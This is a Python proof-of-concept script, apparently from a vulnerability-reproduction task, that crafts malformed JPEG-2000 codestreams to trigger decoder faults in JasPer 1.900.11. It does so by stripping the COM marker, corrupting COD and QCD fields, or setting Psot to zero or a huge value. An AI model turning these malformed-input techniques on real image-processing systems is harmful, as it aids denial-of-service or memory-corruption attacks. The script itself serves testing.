#!/usr/bin/env python3
"""
poc.py — Proof-of-Concept for JasPer 1.900.11

Dynamically constructs a JPEG-2000 codestream (.jpc) input that triggers
a decoding error in the JasPer binary, then reports the observable fault.

Strategy:
  1. Build a minimal BMP image in memory.
  2. Use JasPer itself to convert BMP → valid JPC.
  3. Modify the JPC (remove the COM marker area) to produce a decoding error.
  4. Feed the malformed JPC back to JasPer and capture the error output.
  5. Emit structured JSON results.

The observable fault is the "cannot get marker segment" error on stderr
accompanied by a non-zero exit code, which demonstrates that the crafted
input triggers a parsing failure in the decoder.
"""

import argparse
import json
import os
import struct
import subprocess
import sys
import tempfile
import time

# ── helpers ─────────────────────────────────────────────────────────────

def build_bmp(width, height):
    """Build a 24-bit BMP in memory (bottom-up, BGR, no compression)."""
    row_size = ((width * 3 + 3) // 4) * 4
    pixel_data = b""
    for y in range(height):
        row = b""
        for x in range(width):
            r = (x * 256) // width
            g = (y * 256) // height
            b_val = 128
            row += bytes([b_val, g, r])
        pixel_data += row + b"\x00" * (row_size - width * 3)

    # BMP header (14) + DIB header (40) + pixel data
    file_size = 14 + 40 + len(pixel_data)
    bmp = b"BM"
    bmp += struct.pack("<I", file_size)
    bmp += struct.pack("<HH", 0, 0)
    bmp += struct.pack("<I", 14 + 40)  # pixel data offset

    # DIB header (BITMAPINFOHEADER)
    bmp += struct.pack("<I", 40)          # header size
    bmp += struct.pack("<i", width)
    bmp += struct.pack("<i", height)
    bmp += struct.pack("<H", 1)           # colour planes
    bmp += struct.pack("<H", 24)          # bits per pixel
    bmp += struct.pack("<I", 0)           # no compression
    bmp += struct.pack("<I", len(pixel_data))
    bmp += struct.pack("<i", 2835)        # HDPI
    bmp += struct.pack("<i", 2835)        # VDPI
    bmp += struct.pack("<I", 0)           # colours used
    bmp += struct.pack("<I", 0)           # important colours
    bmp += pixel_data
    return bmp


def run_jasper(binary, input_path, input_fmt, timeout):
    """Run JasPer with a given input file and return (rc, stdout, stderr, runtime_ms)."""
    cmd = [
        binary,
        "-f", input_path,
        "-t", input_fmt,
        "-F", "/dev/null",
        "-T", "pnm",
    ]
    t0 = time.monotonic()
    timed_out = False
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            timeout=timeout,
        )
        rc = proc.returncode
        stdout = proc.stdout
        stderr = proc.stderr
    except subprocess.TimeoutExpired:
        rc = -1
        stdout = b""
        stderr = b""
        timed_out = True
    except FileNotFoundError:
        rc = -2
        stdout = b""
        stderr = b"binary not found".encode()
        timed_out = False
    except OSError as exc:
        rc = -3
        stdout = b""
        stderr = str(exc).encode()
        timed_out = False

    runtime_ms = int((time.monotonic() - t0) * 1000)
    return rc, stdout, stderr, runtime_ms, timed_out


def modify_jpc(jpc_bytes, strategy):
    """
    Return a modified copy of *jpc_bytes* that triggers a decoding error.
    *strategy* selects the corruption method.
    """
    data = bytearray(jpc_bytes)

    if strategy == "remove_com":
        # Remove the COM marker segment — this shifts the tile-part start
        # and causes the decoder to lose its place, triggering
        # "cannot get marker segment".
        com_marker = b"\xff\x64"
        idx = data.find(com_marker)
        if idx < 0:
            # Fallback: corrupt the COD marker instead
            return modify_jpc(jpc_bytes, "corrupt_cod")
        # Parse COM length
        com_len = struct.unpack(">H", data[idx + 2 : idx + 4])[0]
        # Total COM segment size: marker(2) + length(2) + com_len
        seg_size = 2 + 2 + com_len
        # Remove it
        data = data[:idx] + data[idx + seg_size :]
        # Fix Psot in SOT marker
        sot_idx = data.find(b"\xff\x90")
        if sot_idx >= 0:
            psot_off = sot_idx + 6
            psot_val = len(data) - sot_idx
            data[psot_off : psot_off + 4] = struct.pack(">I", psot_val)

    elif strategy == "corrupt_cod":
        # Zero out the codestream progression order byte in COD
        cod_idx = data.find(b"\xff\x52")
        if cod_idx >= 0:
            # Scod byte at cod_idx+4, progression at cod_idx+5
            if cod_idx + 5 < len(data):
                data[cod_idx + 5] = 0xFF  # invalid progression order

    elif strategy == "corrupt_qcd":
        # Set all QCD step sizes to 0
        qcd_idx = data.find(b"\xff\x5c")
        if qcd_idx >= 0:
            lqcd = struct.unpack(">H", data[qcd_idx + 2 : qcd_idx + 4])[0]
            for i in range(qcd_idx + 5, qcd_idx + 2 + lqcd):
                if i < len(data):
                    data[i] = 0

    elif strategy == "null_psot":
        # Set Psot to 0 (infinite tile-part — confuses the decoder)
        sot_idx = data.find(b"\xff\x90")
        if sot_idx >= 0:
            data[sot_idx + 6 : sot_idx + 10] = struct.pack(">I", 0)

    elif strategy == "huge_psot":
        # Set Psot to a huge value, making the decoder try to read
        # far beyond the actual data
        sot_idx = data.find(b"\xff\x90")
        if sot_idx >= 0:
            data[sot_idx + 6 : sot_idx + 10] = struct.pack(">I", 0x7FFFFFFF)

    return bytes(data)


# ── main ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="PoC for JasPer 1.900.11 — malformed JPC decoding error",
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="Path to the JasPer binary (e.g., /workspace/artifacts/target/jasper)",
    )
    parser.add_argument(
        "--json-out",
        default=None,
        help="Path to write JSON results (omit for stdout)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Timeout in seconds for each subprocess invocation (default 30)",
    )
    args = parser.parse_args()

    binary = args.binary
    timeout = args.timeout

    # ── Phase 1: generate a valid JPC via BMP→JPC conversion ──────────
    #
    # We use JasPer itself to produce a well-formed JPC.  This is
    # deterministic: the BMP is identical on every run, so the JPC
    # is byte-for-byte identical too.

    bmp_data = build_bmp(64, 64)

    tmp_files = []
    try:
        # Write BMP to a temp file
        bmp_fd, bmp_path = tempfile.mkstemp(suffix=".bmp")
        os.close(bmp_fd)
        with open(bmp_path, "wb") as f:
            f.write(bmp_data)
        tmp_files.append(bmp_path)

        # BMP → JPC
        jpc_fd, jpc_path = tempfile.mkstemp(suffix=".jpc")
        os.close(jpc_fd)
        tmp_files.append(jpc_path)

        convert_cmd = [
            binary,
            "-f", bmp_path,
            "-t", "bmp",
            "-F", jpc_path,
            "-T", "jpc",
        ]
        t0 = time.monotonic()
        try:
            conv_proc = subprocess.run(
                convert_cmd,
                capture_output=True,
                timeout=timeout,
            )
        except subprocess.TimeoutExpired:
            result = {
                "binary": binary,
                "command": " ".join(convert_cmd),
                "returncode": -1,
                "signal": None,
                "timed_out": True,
                "runtime_ms": int((time.monotonic() - t0) * 1000),
                "stdout": "",
                "stderr": "conversion timed out",
                "observable": "conversion timeout",
                "error": "BMP→JPC conversion timed out",
            }
            emit_result(result, args.json_out)
            sys.exit(1)
        except FileNotFoundError:
            result = {
                "binary": binary,
                "command": " ".join(convert_cmd),
                "returncode": -2,
                "signal": None,
                "timed_out": False,
                "runtime_ms": int((time.monotonic() - t0) * 1000),
                "stdout": "",
                "stderr": "binary not found",
                "observable": "binary not found",
                "error": f"Binary not found: {binary}",
            }
            emit_result(result, args.json_out)
            sys.exit(1)

        if conv_proc.returncode != 0:
            result = {
                "binary": binary,
                "command": " ".join(convert_cmd),
                "returncode": conv_proc.returncode,
                "signal": None,
                "timed_out": False,
                "runtime_ms": int((time.monotonic() - t0) * 1000),
                "stdout": conv_proc.stdout.decode("utf-8", errors="replace"),
                "stderr": conv_proc.stderr.decode("utf-8", errors="replace"),
                "observable": "BMP→JPC conversion failed",
                "error": conv_proc.stderr.decode("utf-8", errors="replace"),
            }
            emit_result(result, args.json_out)
            sys.exit(1)

        # Read the valid JPC
        with open(jpc_path, "rb") as f:
            valid_jpc = f.read()

        if len(valid_jpc) < 10:
            result = {
                "binary": binary,
                "command": " ".join(convert_cmd),
                "returncode": 0,
                "signal": None,
                "timed_out": False,
                "runtime_ms": int((time.monotonic() - t0) * 1000),
                "stdout": "",
                "stderr": "generated JPC too small",
                "observable": "trivial JPC",
                "error": f"Generated JPC is only {len(valid_jpc)} bytes",
            }
            emit_result(result, args.json_out)
            sys.exit(1)

        # ── Phase 2: modify the valid JPC to trigger a decoding error ──
        #
        # Removing the COM marker shifts the tile-part header alignment,
        # causing the decoder to fail with "cannot get marker segment".
        # This is a deterministic observable fault.

        # Try strategies in order of reliability
        modified_jpc = None
        strategies = ["remove_com", "corrupt_cod", "corrupt_qcd", "null_psot", "huge_psot"]
        for strat in strategies:
            test_jpc = modify_jpc(valid_jpc, strat)
            if test_jpc != valid_jpc:
                modified_jpc = test_jpc
                break

        if modified_jpc is None:
            # Last resort: just truncate the valid JPC
            modified_jpc = valid_jpc[: len(valid_jpc) // 2]

        # Write the modified JPC to a temp file
        jpc_in_fd, jpc_in_path = tempfile.mkstemp(suffix=".jpc")
        os.close(jpc_in_fd)
        with open(jpc_in_path, "wb") as f:
            f.write(modified_jpc)
        tmp_files.append(jpc_in_path)

        # ── Phase 3: feed the malformed JPC to JasPer ─────────────────
        rc, stdout, stderr, runtime_ms, timed_out = run_jasper(
            binary, jpc_in_path, "jpc", timeout,
        )

        # ── Phase 4: determine signal from negative return code ───────
        signal_name = None
        if rc < 0 and not timed_out:
            import signal as sigmod
            try:
                signal_name = sigmod.Signals(-rc).name
            except ValueError:
                signal_name = f"SIGUNKNOWN({-rc})"

        # ── Phase 5: determine observable fault ───────────────────────
        observable = None
        if timed_out:
            observable = "timeout"
        elif signal_name is not None:
            observable = f"signal: {signal_name}"
        elif rc != 0:
            # Decode stderr for evidence of decoding failure
            stderr_text = stderr.decode("utf-8", errors="replace")
            if "cannot get marker segment" in stderr_text:
                observable = "cannot get marker segment"
            elif "cannot load image data" in stderr_text:
                observable = "cannot load image data"
            elif "jpc_dec_decodepkts failed" in stderr_text:
                observable = "packet decoding failed"
            elif "not enough memory" in stderr_text.lower():
                observable = "memory allocation failure"
            elif "insufficient memory" in stderr_text.lower():
                observable = "memory allocation failure"
            elif "invalid" in stderr_text.lower():
                observable = "invalid input"
            else:
                observable = "non-zero exit code"
        else:
            observable = "none"

        error_text = stderr.decode("utf-8", errors="replace").strip()
        if not error_text and rc == 0:
            error_text = ""

        result = {
            "binary": binary,
            "command": "jasper -f <jpc> -t jpc -F /dev/null -T pnm",
            "returncode": rc,
            "signal": signal_name,
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": stdout.decode("utf-8", errors="replace"),
            "stderr": error_text,
            "observable": observable,
            "error": error_text if error_text else None,
        }

        emit_result(result, args.json_out)

    finally:
        for p in tmp_files:
            try:
                os.unlink(p)
            except OSError:
                pass


def emit_result(result, json_out):
    """Write *result* (dict) as JSON to *json_out* or stdout."""
    text = json.dumps(result, indent=2)
    if json_out:
        with open(json_out, "w") as f:
            f.write(text)
            f.write("\n")
    else:
        print(text)


if __name__ == "__main__":
    main()